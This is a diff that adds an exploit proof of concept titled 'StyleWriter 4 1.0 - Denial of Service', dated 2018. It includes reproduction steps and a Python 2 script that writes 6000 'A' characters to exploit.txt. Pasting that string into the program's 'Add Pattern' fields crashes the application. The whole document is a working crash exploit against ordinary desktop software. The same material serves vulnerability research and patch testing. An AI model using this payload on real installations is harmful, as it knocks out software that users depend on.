@@ -1,0 +1,27 @@
+# Exploit Title: StyleWriter 4 1.0 - Denial of Service (PoC)
+# Author: Gionathan "John" Reale
+# Discovey Date: 2018-08-23
+# Homepage: http://www.editorsoftware.com
+# Software Link: http://www.editorsoftware.com/StyleWriter_Download.php
+# Tested Version: 1.0
+# Tested on OS: Windows 7 32-bit
+# Steps to Reproduce: Run the python exploit script, it will create a new 
+# file with the name "exploit.txt" just copy the text inside "exploit.txt"
+# and start the program. In the new window click "Tools" >"Add Pattern...". 
+# Now in the new window paste the content of 
+# "exploit.txt" into the following fields:"Pattern to Find" & "Advice Message". 
+# Click "Add" and you will see a crash.
+
+#!/usr/bin/python
+   
+buffer = "A" * 6000
+
+payload = buffer
+try:
+    f=open("exploit.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
